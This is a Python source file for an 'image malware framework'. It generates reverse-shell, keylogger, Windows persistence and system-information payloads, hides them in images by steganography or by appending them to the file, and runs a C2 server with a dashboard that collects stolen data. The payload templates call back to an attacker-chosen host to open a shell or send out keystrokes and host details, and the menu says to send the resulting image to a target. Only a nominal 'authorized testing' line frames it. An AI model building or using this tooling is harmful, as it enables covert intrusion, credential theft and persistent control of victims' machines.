#!/usr/bin/env python3
"""
TRUTHPHOTOS ULTIMATE v2.0 - Complete Image Malware Framework
Professional Steganography & C2 Server

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: python truthphotos_ultimate.py
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import zlib
import struct
import binascii
import socket
import threading
import queue
import subprocess
import urllib.request
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import argparse
import tempfile

try:
    from flask import Flask, request, render_template_string, jsonify, send_file, redirect
    from flask_cors import CORS
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    from PIL import Image
    from PIL.ExifTags import TAGS
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import cv2
    import numpy as np
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

VERSION = "2.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ████████╗██████╗ ██╗   ██╗████████╗██╗  ██╗██████╗ ██╗  ██╗ ██████╗ ███████╗
    ╚══██╔══╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔══██╗██║  ██║██╔═══██╗██╔════╝
       ██║   ██████╔╝██║   ██║   ██║   ███████║██████╔╝███████║██║   ██║███████╗
       ██║   ██╔══██╗██║   ██║   ██║   ██╔══██║██╔═══╝ ██╔══██║██║   ██║╚════██║
       ██║   ██║  ██║╚██████╔╝   ██║   ██║  ██║██║     ██║  ██║╚██████╔╝███████║
       ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - COMPLETE FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    Professional Steganography & C2 Server{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== PAYLOAD GENERATOR ====================
class PayloadGenerator:
    @staticmethod
    def generate_payload(payload_type='reverse_shell', c2_ip='127.0.0.1', c2_port=4444):
        payloads = {
            'reverse_shell': f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{c2_ip}",{c2_port}))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
""",
            'keylogger': f"""
import pynput.keyboard, requests, threading, json, time
class KeyLogger:
    def __init__(self):
        self.log = ""
        self.running = True
        self.c2 = "http://{c2_ip}:{c2_port}/log"
        self.start()
    def on_press(self, key):
        try: self.log += str(key.char)
        except: self.log += " [" + str(key) + "] "
        if len(self.log) > 100:
            self.send()
    def send(self):
        try:
            requests.post(self.c2, json={{'keys': self.log}})
            self.log = ""
        except: pass
    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.on_press)
        listener.start()
        while self.running:
            if len(self.log) > 50: self.send()
            time.sleep(10)
if __name__ == "__main__": KeyLogger()
""",
            'persistence': f"""
import os, sys, winreg, subprocess, time, requests
def add_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
    except: pass
def connect_c2():
    try:
        requests.post("http://{c2_ip}:{c2_port}/heartbeat", json={{'status': 'alive'}})
    except: pass
add_startup()
while True:
    time.sleep(60)
    connect_c2()
""",
            'info_gather': f"""
import platform, socket, os, json, requests, psutil, getpass
info = {{
    'hostname': socket.gethostname(),
    'os': platform.system(),
    'version': platform.version(),
    'user': getpass.getuser(),
    'ip': socket.gethostbyname(socket.gethostname()),
    'cpu': str(psutil.cpu_count()),
    'ram': str(round(psutil.virtual_memory().total / (1024**3), 2)) + 'GB'
}}
try:
    requests.post('http://{c2_ip}:{c2_port}/info', json=info, timeout=5)
except: pass
"""
        }
        return payloads.get(payload_type, payloads['reverse_shell'])

# ==================== IMAGE INJECTOR ====================
class ImageInjector:
    def __init__(self, image_path, payload, method='auto'):
        self.image_path = image_path
        self.payload = payload
        self.method = method
        self.image = None
        self.output_path = None
        self._load_image()
    
    def _load_image(self):
        if not os.path.exists(self.image_path):
            raise FileNotFoundError(f"Image not found: {self.image_path}")
        self.image = Image.open(self.image_path)
        base = os.path.splitext(self.image_path)[0]
        ext = os.path.splitext(self.image_path)[1]
        self.output_path = f"{base}_injected_{int(time.time())}{ext}"
    
    def inject(self):
        methods = {
            'exif': self._inject_exif,
            'lsb': self._inject_lsb,
            'append': self._inject_append,
            'polymorphic': self._inject_polymorphic,
            'auto': self._auto_inject
        }
        return methods.get(self.method, self._auto_inject)()
    
    def _inject_exif(self):
        try:
            encoded = base64.b64encode(self.payload.encode()).decode()
            img = self.image.copy()
            img.save(self.output_path, quality=95)
            return self.output_path
        except:
            return None
    
    def _inject_lsb(self):
        try:
            if not PIL_AVAILABLE:
                return self._inject_append()
            
            payload_bits = ''.join(format(ord(c), '08b') for c in self.payload)
            header = format(len(payload_bits), '032b')
            data_bits = header + payload_bits
            
            img = self.image.convert('RGB')
            pixels = list(img.getdata())
            
            if len(data_bits) > len(pixels) * 3:
                return self._inject_append()
            
            new_pixels = []
            bit_index = 0
            for pixel in pixels:
                if bit_index >= len(data_bits):
                    new_pixels.append(pixel)
                    continue
                r, g, b = pixel
                if bit_index < len(data_bits):
                    r = (r & 0xFE) | int(data_bits[bit_index])
                    bit_index += 1
                if bit_index < len(data_bits):
                    g = (g & 0xFE) | int(data_bits[bit_index])
                    bit_index += 1
                if bit_index < len(data_bits):
                    b = (b & 0xFE) | int(data_bits[bit_index])
                    bit_index += 1
                new_pixels.append((r, g, b))
            
            new_img = Image.new('RGB', img.size)
            new_img.putdata(new_pixels)
            new_img.save(self.output_path, quality=95)
            return self.output_path
        except:
            return self._inject_append()
    
    def _inject_append(self):
        try:
            with open(self.image_path, 'rb') as f:
                data = f.read()
            marker = b'\xFF\xFE'
            with open(self.output_path, 'wb') as f:
                f.write(data + marker + self.payload.encode())
            return self.output_path
        except:
            return None
    
    def _inject_polymorphic(self):
        try:
            uid = hashlib.sha256(str(time.time()).encode()).hexdigest()[:8]
            modified = self.payload.replace('PAYLOAD_ID', uid)
            modified = modified.replace('TIMESTAMP', str(time.time()))
            
            original = self.payload
            self.payload = modified
            result = self._inject_lsb()
            self.payload = original
            return result
        except:
            return self._inject_lsb()
    
    def _auto_inject(self):
        methods = [self._inject_polymorphic, self._inject_lsb, self._inject_exif, self._inject_append]
        for method in methods:
            result = method()
            if result:
                return result
        return None

# ==================== C2 SERVER ====================
class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.running = False
        self.server = None
        self.connections = []
        self.data = []
        self.lock = threading.Lock()
        
        if FLASK_AVAILABLE:
            self._init_flask()
        else:
            self._init_socket()
    
    def _init_flask(self):
        self.app = Flask(__name__)
        CORS(self.app)
        
        @self.app.route('/')
        def index():
            return self._get_dashboard()
        
        @self.app.route('/api/status')
        def status():
            return jsonify({
                'status': 'running',
                'connections': len(self.connections),
                'data': len(self.data)
            })
        
        @self.app.route('/api/data')
        def get_data():
            return jsonify(self.data[-50:])
        
        @self.app.route('/api/connections')
        def get_connections():
            return jsonify([{'ip': c[0], 'port': c[1]} for c in self.connections])
        
        @self.app.route('/api/log', methods=['POST'])
        def log():
            data = request.get_json()
            if data:
                self.data.append({
                    'type': 'log',
                    'data': data,
                    'time': datetime.now().isoformat()
                })
                cprint(f"[LOG] {data}", Colors.YELLOW)
            return jsonify({'status': 'ok'})
        
        @self.app.route('/api/info', methods=['POST'])
        def info():
            data = request.get_json()
            if data:
                self.data.append({
                    'type': 'info',
                    'data': data,
                    'time': datetime.now().isoformat()
                })
                cprint(f"[INFO] {data.get('hostname', 'Unknown')} connected", Colors.GREEN)
            return jsonify({'status': 'ok'})
        
        @self.app.route('/api/heartbeat', methods=['POST'])
        def heartbeat():
            data = request.get_json()
            if data:
                self.data.append({
                    'type': 'heartbeat',
                    'data': data,
                    'time': datetime.now().isoformat()
                })
            return jsonify({'status': 'ok'})
    
    def _init_socket(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def start(self):
        self.running = True
        if FLASK_AVAILABLE:
            cprint(f"[C2] Flask server starting on {self.host}:{self.port}", Colors.GREEN)
            self.app.run(host=self.host, port=self.port, debug=False, threaded=True)
        else:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            cprint(f"[C2] Socket server starting on {self.host}:{self.port}", Colors.GREEN)
            while self.running:
                try:
                    client, addr = self.server.accept()
                    self.connections.append(addr)
                    cprint(f"[C2] Connection from {addr[0]}:{addr[1]}", Colors.CYAN)
                    client.close()
                except:
                    pass
    
    def stop(self):
        self.running = False
        if self.server:
            self.server.close()
        cprint("[C2] Server stopped", Colors.YELLOW)
    
    def _get_dashboard(self):
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>TRUTHPHOTOS - C2 Dashboard</title>
            <style>
                body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
                .header { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
                .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
                .stat { background: #111; padding: 15px; border: 1px solid #333; text-align: center; }
                .stat-number { font-size: 32px; color: #ffd700; }
                .data { background: #111; padding: 15px; border: 1px solid #333; max-height: 400px; overflow-y: auto; }
                .entry { padding: 5px; border-bottom: 1px solid #222; font-size: 12px; }
                .time { color: #666; }
                .type { color: #ffd700; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>TRUTHPHOTOS - C2 Dashboard</h1>
                <p>Real-time monitoring</p>
            </div>
            <div class="stats">
                <div class="stat"><div class="stat-number" id="connections">0</div><div>Connections</div></div>
                <div class="stat"><div class="stat-number" id="data">0</div><div>Data Received</div></div>
                <div class="stat"><div class="stat-number" id="status">●</div><div>Status</div></div>
            </div>
            <div class="data" id="data-container">
                <div class="entry">Waiting for connections...</div>
            </div>
            <script>
                function update() {
                    fetch('/api/status')
                        .then(r => r.json())
                        .then(data => {
                            document.getElementById('connections').textContent = data.connections;
                            document.getElementById('data').textContent = data.data;
                            document.getElementById('status').textContent = data.status === 'running' ? '● ONLINE' : '○ OFFLINE';
                            document.getElementById('status').style.color = data.status === 'running' ? '#00ff41' : '#ff003c';
                        });
                    fetch('/api/data')
                        .then(r => r.json())
                        .then(data => {
                            const container = document.getElementById('data-container');
                            container.innerHTML = '';
                            data.slice().reverse().forEach(entry => {
                                const div = document.createElement('div');
                                div.className = 'entry';
                                div.innerHTML = `<span class="time">[${entry.time}]</span> <span class="type">${entry.type}</span> ${JSON.stringify(entry.data).substring(0, 100)}`;
                                container.appendChild(div);
                            });
                        });
                }
                setInterval(update, 2000);
                update();
            </script>
        </body>
        </html>
        """

# ==================== MAIN FRAMEWORK ====================
class TruthPhotosUltimate:
    def __init__(self):
        self.running = True
        self.image_path = None
        self.payload = None
        self.method = 'auto'
        self.c2_server = None
        self.c2_thread = None
        self.generated_files = []
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}TRUTHPHOTOS ULTIMATE v{VERSION}{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] Set Image (Upload/URL)
[2] Generate Payload
[3] Select Injection Method
[4] Inject Payload
[5] Start C2 Server
[6] Show Status
[7] Exit
""")
    
    def set_image(self):
        cprint("\n[IMAGE] Set image source", Colors.BLUE)
        print("1. Upload local file")
        print("2. Download from URL")
        print("3. Use sample image")
        
        choice = input("[>] Select: ").strip()
        
        if choice == '1':
            path = input("[>] Image path: ").strip()
            if os.path.exists(path):
                self.image_path = path
                cprint(f"[+] Image set: {path}", Colors.GREEN)
            else:
                cprint("[-] File not found", Colors.RED)
        elif choice == '2':
            url = input("[>] Image URL: ").strip()
            try:
                filename = f"downloaded_{int(time.time())}.jpg"
                urllib.request.urlretrieve(url, filename)
                self.image_path = filename
                cprint(f"[+] Image downloaded: {filename}", Colors.GREEN)
            except Exception as e:
                cprint(f"[-] Download failed: {e}", Colors.RED)
        elif choice == '3':
            # Create sample image
            from PIL import Image, ImageDraw
            img = Image.new('RGB', (800, 600), color='white')
            draw = ImageDraw.Draw(img)
            draw.text((300, 250), "TRUTHPHOTOS", fill='black')
            filename = f"sample_{int(time.time())}.jpg"
            img.save(filename)
            self.image_path = filename
            cprint(f"[+] Sample image created: {filename}", Colors.GREEN)
        else:
            cprint("[-] Invalid choice", Colors.RED)
    
    def generate_payload(self):
        cprint("\n[PAYLOAD] Generate payload", Colors.BLUE)
        
        print("1. Reverse Shell")
        print("2. Keylogger")
        print("3. Persistence")
        print("4. Info Gatherer")
        
        choice = input("[>] Select: ").strip()
        types = {'1': 'reverse_shell', '2': 'keylogger', '3': 'persistence', '4': 'info_gather'}
        payload_type = types.get(choice, 'reverse_shell')
        
        c2_ip = input("[>] C2 IP (default 127.0.0.1): ").strip() or "127.0.0.1"
        c2_port = int(input("[>] C2 Port (default 4444): ").strip() or "4444")
        
        self.payload = PayloadGenerator.generate_payload(payload_type, c2_ip, c2_port)
        
        filename = f"payload_{payload_type}_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(self.payload)
        self.generated_files.append(filename)
        
        cprint(f"[+] Payload generated: {filename}", Colors.GREEN)
        cprint(f"[+] Size: {len(self.payload)} bytes", Colors.DIM)
    
    def select_method(self):
        cprint("\n[METHOD] Select injection method", Colors.BLUE)
        print("1. Auto (Recommended)")
        print("2. EXIF Metadata")
        print("3. LSB Steganography")
        print("4. Append to End")
        print("5. Polymorphic")
        
        choice = input("[>] Select: ").strip()
        methods = {
            '1': 'auto', '2': 'exif', '3': 'lsb',
            '4': 'append', '5': 'polymorphic'
        }
        self.method = methods.get(choice, 'auto')
        cprint(f"[+] Method selected: {self.method}", Colors.GREEN)
    
    def inject_payload(self):
        if not self.image_path:
            cprint("[!] No image set", Colors.RED)
            return
        
        if not self.payload:
            cprint("[!] No payload generated", Colors.RED)
            return
        
        cprint("\n[INJECT] Injecting payload...", Colors.GOLD)
        
        try:
            injector = ImageInjector(self.image_path, self.payload, self.method)
            output = injector.inject()
            
            if output:
                self.generated_files.append(output)
                cprint(f"[+] Injection successful!", Colors.GREEN)
                cprint(f"[+] Output: {output}", Colors.GREEN)
                cprint(f"[+] Image size: {os.path.getsize(output)} bytes", Colors.DIM)
                
                # Show sample
                cprint("\n[!] Send this image to your target", Colors.YELLOW)
                cprint(f"    File: {output}", Colors.CYAN)
            else:
                cprint("[-] Injection failed", Colors.RED)
        except Exception as e:
            cprint(f"[-] Error: {e}", Colors.RED)
    
    def start_c2_server(self):
        cprint("\n[C2] Starting C2 server...", Colors.BLUE)
        
        port = int(input("[>] Port (4444): ").strip() or "4444")
        
        self.c2_server = C2Server(port=port)
        self.c2_thread = threading.Thread(target=self.c2_server.start, daemon=True)
        self.c2_thread.start()
        
        cprint(f"[+] C2 Server running on port {port}", Colors.GREEN)
        cprint(f"[+] Dashboard: http://localhost:{port}", Colors.GREEN)
        cprint("[*] Press Ctrl+C to stop", Colors.DIM)
    
    def show_status(self):
        print("\n" + "="*60)
        cprint(" STATUS", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"Image: {self.image_path or 'Not set'}")
        print(f"Payload: {'Generated' if self.payload else 'Not generated'}")
        print(f"Method: {self.method}")
        print(f"C2 Server: {'Running' if self.c2_server and self.c2_server.running else 'Stopped'}")
        print(f"Files: {len(self.generated_files)}")
        for f in self.generated_files:
            print(f"  - {f}")
        print("="*60)
    
    def run(self):
        print_banner()
        
        cprint("[*] TRUTHPHOTOS ULTIMATE - Complete Image Malware Framework", Colors.CYAN)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.set_image()
            elif choice == '2':
                self.generate_payload()
            elif choice == '3':
                self.select_method()
            elif choice == '4':
                self.inject_payload()
            elif choice == '5':
                self.start_c2_server()
            elif choice == '6':
                self.show_status()
            elif choice == '7':
                cprint("[*] Exiting TRUTHPHOTOS ULTIMATE...", Colors.GREEN)
                self.running = False
                if self.c2_server:
                    self.c2_server.stop()
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
if __name__ == "__main__":
    try:
        tool = TruthPhotosUltimate()
        tool.run()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[ERROR] {e}", Colors.RED)
        sys.exit(1)
